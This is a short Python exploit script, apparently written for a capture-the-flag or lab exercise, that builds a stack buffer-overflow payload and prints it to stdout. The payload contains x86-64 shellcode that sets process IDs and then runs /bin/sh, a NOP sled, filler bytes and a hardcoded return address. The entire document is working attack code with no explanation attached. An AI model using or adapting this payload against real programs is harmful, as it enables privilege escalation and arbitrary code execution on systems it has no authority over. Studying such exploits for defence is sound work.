import sys
import struct

shellcode = (
    b"\x6a\x71"                                    
    b"\x58"                                 
    b"\x8d\x7c\xc0\x02"                            
    b"\x89\xfe"                             
    b"\x0f\x05"                                 
    b"\x31\xf6"                                 
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    b"\x53"                                        
    b"\x54"                                        
    b"\x5f"                                        
    b"\xb0\x3b"                                    
    b"\x0f\x05"                                 
)

exploit = b""
exploit += b"\x90" * (32 - len(shellcode)) + shellcode
exploit += b"C" * 16
exploit += struct.pack("Q", 0x7fffffffe200)     
exploit += b"C" * 8
exploit += b"\x28"

sys.stdout.buffer.write(exploit)

